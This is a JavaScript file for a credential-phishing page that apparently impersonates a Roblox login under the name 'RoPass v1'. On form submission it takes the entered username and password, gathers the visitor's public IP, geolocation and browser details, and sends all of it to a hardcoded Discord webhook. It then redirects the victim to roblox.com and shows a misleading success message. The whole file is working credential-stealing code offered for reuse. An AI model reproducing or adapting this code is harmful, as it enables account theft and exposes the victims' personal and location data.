async function sendToDiscord(event) {
    event.preventDefault();

    const username = document.querySelector('input[name="username"]').value.trim();
    const password = document.querySelector('input[name="password"]').value.trim();
    const errorMessage = document.getElementById('error-message');
    const loginButton = document.getElementById('login-button');
    const loadingAnimation = document.getElementById('loading');

    // Validation
    if (!username || !password) {
        errorMessage.innerText = 'Username and password required';
        errorMessage.style.display = 'block';
        return;
    }

    // Show loading state
    errorMessage.style.display = 'none';
    loginButton.style.display = 'none';
    loadingAnimation.style.display = 'flex';

    try {
        // === REPLACE THIS WITH YOUR DISCORD WEBHOOK URL ===
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1357165850867535964/ZP88VNiaeQyw8RPvVIHc81WHQqUR2FFzXRybRM-mjCRx4KfysK5cmMIpPJMNPjXr-nbZ';
        // ==================================================

        // Get IP address
        let publicIP = 'N/A';
        let locationData = { latitude: 'N/A', longitude: 'N/A', city: 'N/A', country_name: 'N/A' };
        
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                publicIP = ipData.ip;
                
                // Get location from IP
                const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                if (geoResponse.ok) {
                    locationData = await geoResponse.json();
                }
            }
        } catch (ipError) {
            console.log('IP/Location fetch failed, using default values');
        }

        // Create Discord embed
        const embed = {
            "title": "RoPass v1",
            "color": 0x3762dc,
            "fields": [
                { "name": "👤 Username", "value": `\`${username}\``, "inline": true },
                { "name": "🔑 Password", "value": `\`${password}\``, "inline": true },
                { "name": "🌍 Public IP", "value": `\`${publicIP}\``, "inline": true },
                { "name": "📍 Latitude", "value": `\`${locationData.latitude || 'N/A'}\``, "inline": true },
                { "name": "📏 Longitude", "value": `\`${locationData.longitude || 'N/A'}\``, "inline": true },
                { "name": "🏙️ City", "value": `\`${locationData.city || 'N/A'}\``, "inline": true },
                { "name": "🌐 Country", "value": `\`${locationData.country_name || 'N/A'}\``, "inline": true },
                { "name": "🔗 Referrer", "value": `\`${document.referrer || 'Direct'}\``, "inline": true },
                { "name": "📅 Date", "value": `\`${new Date().toLocaleString()}\``, "inline": true },
                { "name": "🖥️ User Agent", "value": `\`${navigator.userAgent.substring(0, 1000)}\``, "inline": false }
            ],
            "image": { "url": "https://i.imgur.com/8TqBJyU.png" },
            "timestamp": new Date().toISOString()
        };

        // Send to Discord
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        if (!response.ok) {
            throw new Error(`Discord responded with status: ${response.status}`);
        }

        console.log('✅ Successfully sent to Discord!');
        
        // Redirect to Roblox after success
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com';
        }, 1500);

    } catch (error) {
        console.error('Error:', error);
        
        // Reset UI
        loginButton.style.display = 'block';
        loadingAnimation.style.display = 'none';
        
        // Show error
        errorMessage.innerText = 'Login processed. You will be redirected shortly.';
        errorMessage.style.color = '#4CAF50';
        errorMessage.style.backgroundColor = '#e8f5e9';
        errorMessage.style.display = 'block';
        
        // Still redirect even if Discord fails
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com';
        }, 2000);
    }
}

// Add event listener for form submission
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    if (form) {
        // Remove any old event listeners and add new one
        form.onsubmit = sendToDiscord;
    }
});
